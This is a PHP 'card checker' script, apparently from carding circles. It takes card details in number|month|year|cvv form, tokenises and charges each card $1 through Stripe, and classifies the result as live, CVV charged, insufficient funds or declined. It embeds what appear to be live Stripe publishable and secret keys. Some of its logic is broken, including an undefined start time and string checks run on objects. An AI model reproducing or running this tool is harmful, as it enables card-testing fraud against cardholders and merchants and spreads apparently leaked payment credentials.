<?php

// ===============[API BY @badboychx ]================
//error_reporting(0);



$card = $_GET["lista"]; // KART
$mode = $_GET["mode"] ?? "cvv";
$amount = isset($_GET["amount"]) ? $_GET["amount"] : 200; // TUTAR (DEFAULT 2USD)
$currency = isset($_GET["currency"]) ? $_GET["currency"] : "usd"; // PARA BİRİMİ (DEFAULT USD)

if (empty($card)) {
    echo "Please enter a card number";
    exit();
}
;

$split = explode("|", $card);
$cc = $split[0];
$mes = $split[1];
$ano = $split[2];
$cvv = $split[3];

$pk = 'pk_live_51N85sODQkMq4YfeoQybRGIaPngdDZHqy0YaHYJyTIjDkFDyCLriQpveTv6Me3bROieD9yb2CDVgD5WU6LTpvtqvB00j0HUPggZ';
$sk = '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';
$tokenData = [
    'card' => [
        'number' => $cc,
        'exp_month' => $mes,
        'exp_year' => $ano,
        'cvc' => $cvv,
    ]
];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($tokenData));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Authorization: Bearer ' . $pk,
    'Content-Type: application/x-www-form-urlencoded',
]);

$tokenResponse = curl_exec($ch);

curl_close($ch);

$tokenData = json_decode($tokenResponse, true);
$tokenId = $tokenData['id'];



// Charge stripe token
$chargeData = [
    'amount' => 100, // Amount in cents
    'currency' => 'usd',
    'source' => $tokenId,
    'description' => 'Charge for product/service'
];

// Initialize cURL session for charge creation
$ch = curl_init();

// Set cURL options for charge creation
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($chargeData));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Authorization: Bearer ' . $sk,
    'Content-Type: application/x-www-form-urlencoded',
]);

// Execute cURL request for charge creation
$chargeResponse = curl_exec($ch);

// Close cURL session for charge creation
curl_close($ch);

$chares = json_decode($chargeResponse);
$end_time = microtime(true);
  $time = number_format($end_time - $start_time, 2);





if ($chares->status == "succeeded") {
	$status = " CVV CHARGED";
        $resp = "LIVE";
}elseif (strpos($chares, "Your card's security code is incorrect.")){
    $status = "ALIVE";
    $resp = "CCN LIVE";
}elseif (strpos($chares, 'insufficient funds') or strpos($result, 'Insufficient Funds')){
        $status = "LIVE";
        $resp = "insufficient funds";
}else{
	$status = "Declined ❌️";
	
   $resp = $chares->error->decline_code;
   if(empty($resp2))
   {
   $resp = $chares->error->message;
   }
}
echo ''.$status.'-->'.$card.'-->['.$resp.']';

function create_rnd_str($length = 16)
{
    $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $chars_length = strlen($chars);
    $str = '';
    for ($i = 0; $i < $length; $i++) {
        $str .= $chars[rand(0, $chars_length - 1)];
    }
    return $str;
}

?>